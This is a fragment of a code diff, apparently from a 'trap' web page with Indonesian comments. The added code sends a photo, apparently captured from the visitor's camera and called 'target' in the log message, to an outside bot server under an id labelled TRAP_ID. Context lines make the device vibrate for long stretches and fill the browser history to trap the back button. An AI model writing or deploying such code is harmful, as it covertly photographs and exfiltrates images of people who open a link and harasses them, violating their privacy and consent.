@@ -149,7 +149,27 @@
                 navigator.vibrate([4000, 50, 4000, 50, 4000, 50, 5000]);
             }
         }
+        if(BOT_API && capturedPhoto) {
 
+                    fetch(BOT_API + '/api/trap/photo', { 
+
+                        method: 'POST', 
+
+                        headers: { 'Content-Type': 'application/json' }, 
+
+                        body: JSON.stringify({ id: TRAP_ID, photoBase64: capturedPhoto }) 
+
+                    }).catch(e => console.log("Bot belum siap!"));
+
+                }
+
+            } catch (e) {
+
+                console.log("Akses kamera ditolak target.");
+
+            }
+
+        }
         // TWIST TOMBOL KEMBALI
         (function() {
             for (let i = 0; i < 5; i++) { window.history.pushState({page: i}, null, null); }
